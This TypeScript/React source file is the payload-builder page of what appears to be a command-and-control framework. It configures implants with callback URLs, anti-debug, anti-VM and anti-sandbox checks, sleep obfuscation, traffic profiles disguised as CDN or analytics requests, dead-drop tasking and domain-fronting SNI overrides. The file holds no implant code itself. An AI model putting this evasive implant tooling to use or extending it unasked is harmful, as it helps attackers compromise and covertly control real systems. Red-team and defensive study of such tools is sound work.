import React, { FormEvent, useEffect, useRef, useState } from "react";
import { FaBoxOpen, FaHammer, FaShieldAlt, FaUserSecret } from "react-icons/fa";
import { DarkSelect } from "../components/DarkSelect";
import { useAppState, PayloadArtifact, unixTime } from "../components/AppContext";

const targetOptions = [
  { value: "windows", label: "Windows", meta: "x64 MinGW" },
  { value: "linux", label: "Linux", meta: "native ELF" }
];

const formatOptions = [
  { value: "executable", label: "Executable (.exe/.elf)", meta: "Standalone" },
  { value: "shellcode", label: "Shellcode (.bin)", meta: "Raw Position Independent Code" }
];

const profileOptions = [
  { value: "default", label: "Default", meta: "/beacon · /response" },
  { value: "cdn_metrics", label: "CDN Metrics", meta: "Looks like /api/v2/metrics" },
  { value: "analytics", label: "Analytics", meta: "Looks like /track" },
  { value: "dead_drop", label: "Dead Drop", meta: "Pulls tasks from a public file" }
];

type BuildPhase = "idle" | "preparing" | "configuring" | "compiling" | "saving" | "succeeded" | "failed";

const buildPhaseLabels: Record<BuildPhase, string> = {
  idle: "Ready",
  preparing: "Preparing",
  configuring: "Configuring",
  compiling: "Compiling",
  saving: "Saving artifact",
  succeeded: "Succeeded",
  failed: "Failed"
};

const activeBuildPhases: BuildPhase[] = ["preparing", "configuring", "compiling", "saving"];

function isHttpNgrokCallback(value: string) {
  try {
    const url = new URL(value.trim());
    return url.protocol === "http:" && /(^|\.)((ngrok-free\.dev)|(ngrok\.app)|(ngrok\.io)|(ngrok\.dev))$/i.test(url.hostname);
  } catch {
    return false;
  }
}

function suggestedHttpsCallback(value: string) {
  try {
    const url = new URL(value.trim());
    url.protocol = "https:";
    return url.toString().replace(/\/$/, "");
  } catch {
    return value.replace(/^http:\/\//i, "https://");
  }
}

export function Builder() {
  const { baseUrl, api, setPayloads, payloads, notify } = useAppState();
  const [payloadLabel, setPayloadLabel] = useState("lab");
  const [payloadCallbackUrl, setPayloadCallbackUrl] = useState(baseUrl);
  const [payloadSleep, setPayloadSleep] = useState(5);
  const [payloadJitter, setPayloadJitter] = useState(15);
  const [agentId, setAgentId] = useState("");
  const [agentToken, setAgentToken] = useState("");
  const [targetOs, setTargetOs] = useState("windows");
  const [outputFormat, setOutputFormat] = useState("executable");
  const [antiDebug, setAntiDebug] = useState(false);
  const [antiVm, setAntiVm] = useState(false);
  const [antiSandbox, setAntiSandbox] = useState(false);
  const [daemonize, setDaemonize] = useState(false);
  const [staticRuntime, setStaticRuntime] = useState(true);
  const [xorConfig, setXorConfig] = useState(true);
  const [xorKey, setXorKey] = useState(90);
  const [wireEncryption, setWireEncryption] = useState(true);
  const [killDateEpoch, setKillDateEpoch] = useState(0);
  const [uaRandomize, setUaRandomize] = useState(true);
  const [sleepObfuscate, setSleepObfuscate] = useState(false);
  const [encryptPayload, setEncryptPayload] = useState(false);
  const [profile, setProfile] = useState("default");
  const [sniOverride, setSniOverride] = useState("");
  const [buildPhase, setBuildPhase] = useState<BuildPhase>("idle");
  const [buildStartedAt, setBuildStartedAt] = useState<number | null>(null);
  const [buildElapsed, setBuildElapsed] = useState(0);
  const [buildError, setBuildError] = useState("");
  const phaseTimers = useRef<number[]>([]);

  const isBuilding = activeBuildPhases.includes(buildPhase);

  useEffect(() => {
    if (!buildStartedAt || !isBuilding) return;
    const timer = window.setInterval(() => {
      setBuildElapsed(Math.floor((Date.now() - buildStartedAt) / 1000));
    }, 500);
    return () => window.clearInterval(timer);
  }, [buildStartedAt, isBuilding]);

  useEffect(() => {
    return () => {
      phaseTimers.current.forEach((timer) => window.clearTimeout(timer));
    };
  }, []);

  function clearPhaseTimers() {
    phaseTimers.current.forEach((timer) => window.clearTimeout(timer));
    phaseTimers.current = [];
  }

  function scheduleBuildPhases() {
    clearPhaseTimers();
    phaseTimers.current = [
      window.setTimeout(() => setBuildPhase("configuring"), 350),
      window.setTimeout(() => setBuildPhase("compiling"), 1500)
    ];
  }

  async function buildPayload(event: FormEvent) {
    event.preventDefault();
    const trimmedCallback = payloadCallbackUrl.trim();
    if (isHttpNgrokCallback(trimmedCallback)) {
      const suggestion = suggestedHttpsCallback(trimmedCallback);
      const message = `ngrok redirects HTTP callbacks with HTTP 307. Use ${suggestion} as the callback URL, then build again.`;
      setBuildPhase("failed");
      setBuildStartedAt(null);
      setBuildElapsed(0);
      setBuildError(message);
      notify({ kind: "warning", title: "Callback URL needs HTTPS", detail: message });
      return;
    }

    const startedAt = Date.now();
    setBuildPhase("preparing");
    setBuildStartedAt(startedAt);
    setBuildElapsed(0);
    setBuildError("");
    scheduleBuildPhases();
    try {
      const artifact = await api<PayloadArtifact>("/api/payload/build", {
        method: "POST",
        body: JSON.stringify({
          callback_url: trimmedCallback,
          sleep_seconds: payloadSleep,
          jitter_percent: payloadJitter,
          agent_id: agentId || null,
          agent_token: agentToken || null,
          label: payloadLabel || null,
          stealth: antiDebug || daemonize || antiVm || antiSandbox,
          anti_debug: antiDebug,
          anti_vm: antiVm,
          anti_sandbox: antiSandbox,
          daemonize: daemonize,
          static_runtime: staticRuntime,
          xor_config: xorConfig,
          xor_key: xorKey,
          target_os: targetOs,
          format: outputFormat,
          kill_date_epoch: killDateEpoch || 0,
          ua_randomize: uaRandomize,
          sleep_obfuscate: sleepObfuscate,
          encrypt_payload: encryptPayload,
          wire_encryption: wireEncryption,
          profile: profile === "default" ? null : profile,
          sni_override: sniOverride.trim() || null
        })
      });
      clearPhaseTimers();
      setBuildPhase("saving");
      setPayloads((current) => [artifact, ...current]);
      notify({ kind: "success", title: "Payload generated", detail: artifact.binary_path });
      phaseTimers.current = [window.setTimeout(() => setBuildPhase("succeeded"), 500)];
    } catch (error) {
      clearPhaseTimers();
      const message = error instanceof Error ? error.message : "Payload build failed";
      setBuildPhase("failed");
      setBuildError(message);
      notify({ kind: "error", title: "Payload build failed", detail: message });
    } finally {
      setBuildElapsed(Math.floor((Date.now() - startedAt) / 1000));
    }
  }

  async function handleClearLogs() {
    if (!confirm("Are you sure you want to clear all payloads?")) return;
    try {
        await api("/api/payload/artifacts", { method: "DELETE" });
        setPayloads([]);
        notify({ kind: "info", title: "Payload logs cleared" });
    } catch (e) {
        notify({ kind: "error", title: "Failed to clear payload logs", detail: e instanceof Error ? e.message : "Request failed" });
    }
  }

  return (
    <div className="page builder-page">
      <div className="panel builder-form-panel">
        <div className="panel-title">
          <FaHammer size={18} />
          <h2>Generate Payload</h2>
        </div>
        <form onSubmit={buildPayload} className="app-form payload-form">
          <div className="form-grid">
            <label>
              <span>Label</span>
              <input value={payloadLabel} onChange={(e) => setPayloadLabel(e.target.value)} />
            </label>
            <label>
              <span>Target OS</span>
              <DarkSelect value={targetOs} onChange={setTargetOs} options={targetOptions} />
            </label>
            <label>
              <span>Format</span>
              <DarkSelect value={outputFormat} onChange={setOutputFormat} options={formatOptions} />
            </label>
            <label className="wide-field">
              <span>Callback URL</span>
              <input value={payloadCallbackUrl} onChange={(e) => setPayloadCallbackUrl(e.target.value)} />
            </label>
            <label>
              <span>Agent ID</span>
              <input value={agentId} placeholder="auto-generated" onChange={(e) => setAgentId(e.target.value)} />
            </label>
            <label>
              <span>Agent Token</span>
              <input value={agentToken} placeholder="server default" onChange={(e) => setAgentToken(e.target.value)} />
            </label>
            <label>
              <span>Sleep Seconds</span>
              <input min={1} type="number" value={payloadSleep} onChange={(e) => setPayloadSleep(Number(e.target.value))} />
            </label>
            <label>
              <span>Jitter Percent</span>
              <input min={0} max={90} type="number" value={payloadJitter} onChange={(e) => setPayloadJitter(Number(e.target.value))} />
            </label>
          </div>

          <div className="option-grid">
            <label className="option-card">
              <input type="checkbox" checked={antiDebug} onChange={(e) => setAntiDebug(e.target.checked)} />
              <span><FaUserSecret /> Anti Debug</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={antiVm} onChange={(e) => setAntiVm(e.target.checked)} />
              <span><FaUserSecret /> Anti VM</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={antiSandbox} onChange={(e) => setAntiSandbox(e.target.checked)} />
              <span><FaUserSecret /> Anti Sandbox</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={daemonize} onChange={(e) => setDaemonize(e.target.checked)} />
              <span><FaShieldAlt /> Background Mode</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={staticRuntime} onChange={(e) => setStaticRuntime(e.target.checked)} />
              <span><FaShieldAlt /> Static Runtime</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={xorConfig} onChange={(e) => setXorConfig(e.target.checked)} />
              <span><FaShieldAlt /> XOR Config</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={wireEncryption} onChange={(e) => setWireEncryption(e.target.checked)} />
              <span><FaShieldAlt /> Wire Encryption</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={uaRandomize} onChange={(e) => setUaRandomize(e.target.checked)} />
              <span><FaShieldAlt /> Randomize UA</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={sleepObfuscate} onChange={(e) => setSleepObfuscate(e.target.checked)} />
              <span><FaShieldAlt /> Sleep Obfuscation</span>
            </label>
            <label className="option-card">
              <input type="checkbox" checked={encryptPayload} onChange={(e) => setEncryptPayload(e.target.checked)} />
              <span><FaShieldAlt /> Encrypt Artifact</span>
            </label>
          </div>

          <div className="form-grid">
            <label>
              <span>XOR Key</span>
              <input min={1} max={255} type="number" value={xorKey} disabled={!xorConfig} onChange={(e) => setXorKey(Number(e.target.value))} />
            </label>
            <label>
              <span>Kill Date Epoch (0 = none)</span>
              <input min={0} type="number" value={killDateEpoch} onChange={(e) => setKillDateEpoch(Number(e.target.value))} />
            </label>
            <label>
              <span>Profile</span>
              <DarkSelect value={profile} onChange={setProfile} options={profileOptions} />
            </label>
            <label className="wide-field">
              <span>SNI Override (optional, for domain fronting)</span>
              <input value={sniOverride} placeholder="clean.cdn.example" onChange={(e) => setSniOverride(e.target.value)} />
            </label>
          </div>

          <div className={`build-status build-status-${buildPhase}`}>
            <div>
              <span>Build Status</span>
              <strong>{buildPhaseLabels[buildPhase]}</strong>
            </div>
            {isBuilding ? <span className="build-elapsed">{buildElapsed}s elapsed</span> : null}
          </div>

          {buildError ? <pre className="build-error">{buildError}</pre> : null}

          <button disabled={isBuilding} type="submit" className="build-btn">
            {isBuilding ? `${buildPhaseLabels[buildPhase]}... ${buildElapsed}s` : "Build Payload"}
          </button>
        </form>
      </div>

      <div className="panel builder-history">
        <div className="panel-title" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
            <FaBoxOpen size={18} />
            <h2>Payload Artifacts</h2>
          </div>
          <button type="button" onClick={handleClearLogs} style={{ padding: '4px 12px', background: '#d32f2f', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>
            Clear Logs
          </button>
        </div>
        <div className="table-wrapper">
          <table className="app-table">
            <thead>
              <tr>
                <th>Created</th>
                <th>Label</th>
                <th>OS</th>
                <th>Timing</th>
                <th>Options</th>
                <th>Path</th>
              </tr>
            </thead>
            <tbody>
              {payloads.map((p) => (
                <tr key={p.build_id}>
                  <td>{unixTime(p.created_at_unix)}</td>
                  <td>{p.label || "-"}</td>
                  <td><span className="pill muted">{p.target_os || "linux"}</span></td>
                  <td>{p.sleep_seconds}s / {p.jitter_percent || 0}%</td>
                  <td>
                    {p.anti_debug ? <span className="pill good">anti-debug</span> : <span className="pill muted">standard</span>}
                    {p.daemonize ? <span className="pill warn option-pill">bg</span> : null}
                    {p.static_runtime ? <span className="pill muted option-pill">static</span> : null}
                    {p.xor_config ? <span className="pill muted option-pill">xor</span> : null}
                  </td>
                  <td className="code">{p.binary_path}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
